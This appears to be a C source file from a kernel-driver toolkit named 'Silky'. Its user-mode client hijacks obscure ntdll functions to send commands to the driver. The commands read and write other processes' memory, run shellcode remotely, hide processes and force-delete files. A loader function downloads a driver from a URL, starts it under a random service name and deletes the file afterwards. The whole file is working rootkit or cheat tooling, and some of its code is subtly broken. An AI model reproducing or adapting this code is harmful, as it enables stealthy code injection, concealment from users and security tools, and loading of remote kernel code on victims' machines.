#pragma once
#include "comm.h"
//#include <wininet.h>
//#pragma comment(lib, "Wininet.lib")

HANDLE hFile = NULL;
NtQueryInformationFileProc NtQueryInformationFile = NULL;
pNtConvertBetweenAuxiliaryCounterAndPerformanceCounter callCBCP = NULL;
USHORT BuildNum = NULL;

ULONG64 commKey = 0;

PUCHAR GetCurrentPeb() {
	/*if (_IS_WOW64)
	{
		return (PUCHAR)*(PDWORD)(_readfsbase_u32() + 0x30);
	}
	else {
	
		return (PUCHAR)__readgsqword(0x60);
	}*/
#ifdef _ISWIN32
	return (PUCHAR)__readfsdword(0x30);
#else
	return (PUCHAR)__readgsqword(0x60);
#endif 

}

USHORT GetOsBuildNumber() {
	PUCHAR peb = GetCurrentPeb();
	if (_IS_WOW64)
	{
		return *(PUSHORT)(peb + 0xAC);
	}
	else {

		return  *(PUSHORT)(peb + 0x120);
	}
}

SKSTATUS InitComWin7() {
	NtQueryInformationFile = (NtQueryInformationFileProc)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationFile");
	if (!NtQueryInformationFile)
	{
		return SK_COM_INIT7_NULLCOMFUNC;
	}
	strcat(getenv("windir"), "\\temp\\");
	hFile = CreateFileA("C:\\Silky.sk", FILE_ALL_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == NULL || hFile == (HANDLE)-1)
	{
		return SK_COM_INIT7_CANTCREATEFILE;
	}
	return SK_SUCCESS;
}

SKSTATUS InitComWin10() {
	callCBCP = (pNtConvertBetweenAuxiliaryCounterAndPerformanceCounter)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtConvertBetweenAuxiliaryCounterAndPerformanceCounter");
	if (!callCBCP)
	{
		return SK_COM_INIT10_NULLCOMFUNC;
	}
	return SK_SUCCESS;
}

SKSTATUS InitCom() {
	BuildNum = GetOsBuildNumber();
	//BuildNum = 7600;
	if (BuildNum == 7600 || BuildNum == 7601)
	{
		//win7
		return InitComWin7();
		
	}
	else
	{
		//win10
		return InitComWin10();
	}
}


VOID ComSendWin7(PComPackage pkg) {
	IO_STATUS_BLOCK is = { 0 };
	ULONG ret = NtQueryInformationFile(hFile, &is, pkg, 0xDD, 0x34);
}
VOID ComSendWin10(PComPackage pkg) {
	callCBCP(0, (PUCHAR)&pkg, (PUCHAR)&pkg, NULL);
}

SKSTATUS ComSend(ULONG64 cmd,ULONG64 data1, ULONG64 data2, ULONG64 data3, 
	ULONG64 data4, ULONG64 data5, ULONG64 data6, ULONG64 data7, ULONG64 data8) {
	ComPackage package = { 0 };
	package.sign = commKey;
	package.cmd = cmd;
	package.data1 = data1;
	package.data2 = data2;
	package.data3 = data3;
	package.data4 = data4;
	package.data5 = data5;
	package.data6 = data6;
	package.data7 = data7;
	package.data8 = data8;
	package.errCode = SK_COM_UNHANDLEDPACK;
	if (BuildNum == 7600 || BuildNum == 7601)
	{
		//win7
		ComSendWin7(&package);
	}
	else
	{
		//win10
		ComSendWin10(&package);
	}
	return package.errCode;
}



SKSTATUS GetModuleBase(ULONG64 pid, char* name,PULONG64 base) {
	return ComSend(CMD_GET_MODULE_BASE, (ULONG64)pid, (ULONG64)name, (ULONG64)base, 0,0,0,0,0);
}
SKSTATUS GetPidByName(char* name, ULONG64 ppid) {
	return ComSend(CMD_GET_PID_BYNAME, (ULONG64)name, (ULONG64)ppid, 0, 0, 0, 0, 0, 0);
}
SKSTATUS ReadProcMemory(ULONG64 pid, ULONG64 dst,ULONG64 buf,ULONG64 len,ULONG64 way) {
	return ComSend(CMD_READ_VIRBYPASS, pid, dst, buf, len, way, 0, 0, 0);
}


SKSTATUS WriteProcMemory(ULONG64 pid, ULONG64 dst, ULONG64 buf, ULONG64 len,ULONG64 way) {
	return ComSend(CMD_WRITE_VIRBYPASS, pid, dst, buf, len, way, 0, 0, 0);
}

SKSTATUS QueryMemInfo(ULONG64 pid, ULONG64 addr, ULONG64 pointer) {
	return ComSend(CMD_MEM_QUERY, pid, addr, pointer, 0, 0, 0, 0, 0);
}


SKSTATUS RemoteCall(ULONG64 pid,ULONG64 tid,ULONG64 mode,ULONG64 shellcode,ULONG64 len) {
	return ComSend(CMD_REMOTE_CALL, pid, tid, mode, shellcode, len,0,0,0);
}

SKSTATUS GetExpFuncAddrOfProcModule(ULONG64 pid,char* moduleName, char* funcName,ULONG64 expAddr) {
	return ComSend(CMD_GET_PROC_ADDR, pid, (ULONG64)moduleName, (ULONG64)funcName, expAddr,0,0,0,0);
}

SKSTATUS AllocaProcMemory(ULONG64 pid,ULONG64 size,ULONG64 base) {
	return ComSend(CMD_ALLOC_MEM,  pid,  size,base,0,0,0,0,0);
}

SKSTATUS FreeProcMemory(ULONG64 pid, ULONG64 base) {
	return ComSend(CMD_FREE_MEM, pid, base, 0,0,0,0,0,0);
}

SKSTATUS FindProcSignCode(ULONG64 pid,ULONG64 base,ULONG64 sign,ULONG64 len,ULONG64 retBase) {
	return ComSend(CMD_FIND_SIGN,  pid,  base,(ULONG64)sign,  len, retBase,0,0,0);
}

SKSTATUS HideProcessByPid(ULONG64 pid,ULONG64 dstPid,ULONG64 needClearObj) {
	return ComSend(CMD_HIDE_PROC,pid, dstPid, needClearObj,0,0,0,0,0);
}

SKSTATUS DeleteFileForce(char* path) {
	return ComSend(CMD_DEL_FILE, (ULONG64)path, 0, 0, 0,0,0,0,0);
}


SKSTATUS TestCom() {
	return ComSend(CMD_TEST, 0, 0, 0, 0,0,0,0,0);
}

SKSTATUS GetLastSysErrCode(ULONG64 codeOut) {
	return ComSend(CMD_GET_SYSERRCODE, codeOut, 0, 0, 0, 0, 0, 0, 0);
}


char* MakeRandomString(DWORD len) {
	char str[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	char name[256] = { 0 };
	for (DWORD i = 0; i < len; i++)
	{
		name[i] = str[rand() % 62];
	}
	return name;
}


char* MakeRandomFilePath(PUCHAR path) {
	char* mem = (char*)malloc(256);
	memset(mem, 0, 256);
	memcpy(mem, path, strlen((const char*)path));
	strcat(mem, (const char*)MakeRandomString(8));
	strcat(mem,".sys");
	return mem;
}
char* MakeRandomServiceName() {
	char* mem = (char*)malloc(256);
	memset(mem, 0, 256);
	strcat(mem, (const char*)MakeRandomString(8));
	return mem;
}

BOOLEAN LoadDriverByManager(char* path, char* serviceName)
{
	BOOLEAN bRet = FALSE;
	DWORD dwLastError;
	SC_HANDLE hSCManager;
	SC_HANDLE hService = NULL;

	if (hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS))
	{
		hService = CreateServiceA(
			hSCManager, serviceName,
			serviceName, SERVICE_ALL_ACCESS,
			SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
			SERVICE_ERROR_IGNORE, path,
			NULL, NULL, NULL, NULL, NULL
		);
		
		if (hService == NULL)
		{
			hService = OpenServiceA(hSCManager, serviceName, SERVICE_ALL_ACCESS);

			if (!hService)
			{
				CloseServiceHandle(hSCManager);
				return FALSE;
			}

		}
		StartServiceA(hService, 0, NULL);
		bRet = TRUE;
	}

	if (hService)
	{
		CloseServiceHandle(hService);
	}

	if (hSCManager)
	{
		CloseServiceHandle(hSCManager);
	}

	return bRet;
}




SKSTATUS LoadDriver(const char* driverUrl, ULONG64 key) {
	SKSTATUS st;
	BOOLEAN bol;
	st = InitCom();
	if (st != SK_SUCCESS)
	{
		return st;
	}
	commKey = key;

	st = TestCom();
	if (st == SK_TESTCOM_SUCCESS)
	{
		return st;
	}
	

	if (!SymInitDatFile())
	{
		return SK_DRIVERLOAD_INITSYM;
	}


	char* srvName = MakeRandomServiceName();
	char* sysPath = MakeRandomFilePath((PUCHAR)"C:\\ProgramData\\Silky\\");

	DeleteUrlCacheEntryA(driverUrl);
	HRESULT ret = URLDownloadToFileA(NULL, driverUrl, sysPath, NULL, NULL);
	if (ret != S_OK)
	{
		return SK_DRIVERLOAD_DOWNLOADFAILED;
	}

	bol = LoadDriverByManager(sysPath, srvName);
	DeleteFileA(sysPath);
	if (!bol)
	{
		return SK_DRIVERLOAD_LOADERFALIED;
	}
	//InitCom();
	st = TestCom();
	return st;
}

